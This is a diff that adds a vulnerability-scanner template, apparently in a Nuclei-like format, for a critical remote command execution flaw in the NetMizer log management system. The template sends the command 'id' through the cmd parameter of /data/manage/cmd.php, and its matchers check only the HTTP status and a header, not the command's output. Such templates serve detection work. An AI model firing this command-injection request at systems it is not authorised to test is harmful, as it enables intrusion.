@@ -1,0 +1,24 @@
+id: netmizer-cmd-rce
+brief:
+    title: NetMizer LogManagement System cmd.php - Remote Code Execution
+    by: DhiyaneshDk
+    level: critical
+    about: Remote Command Execution vulnerability in the NetMizer log management system cmd.php, and the attacker can execute the command by passing in the cmd parameter.
+    label:
+        - netmizer
+        - cmd
+        - rce
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/data/manage/cmd.php?cmd=id'
+      signs:
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
